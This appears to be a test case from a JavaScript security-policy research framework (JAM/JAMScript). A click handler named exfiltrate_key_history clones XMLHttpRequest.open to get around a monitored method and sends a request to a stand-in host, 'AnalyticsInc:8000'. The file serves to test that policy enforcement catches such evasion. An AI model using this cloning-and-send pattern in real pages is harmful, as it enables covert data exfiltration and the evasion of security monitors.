
JAM.startProfile('load');
function exfiltrate_key_history(){function v0(){function temp(){return JAMScript.callIntrospect(that.apply,that,[this,arguments],JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1)}var that=this,key;for(key in this){var v1=JAMScript.callIntrospect(this.hasOwnProperty,this,[key],JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);v1&&JAMScript.set(temp,key,this[key])}return temp}xmlhttp=new XMLHttpRequest;var v2=xmlhttp.open;v2.clone=v0;var v2=xmlhttp,v5=xmlhttp.open,
v5=JAMScript.callIntrospect(v5.clone,v5,[],JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);v2.opennew=v5;JAMScript.callIntrospect(xmlhttp.opennew,xmlhttp,["GET","http://AnalyticsInc:8000/submission.html?test=clone3",!0],JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1);JAMScript.callIntrospect(xmlhttp.send,xmlhttp,[null],JAMScript.introspectors.processC6BD08F4643AFC435CEA3BC1F2234D4283B1AEE1)}var v4=document.getElementById("test");
JAMScript.set(v4,"onclick",exfiltrate_key_history);

JAM.stopProfile('load');
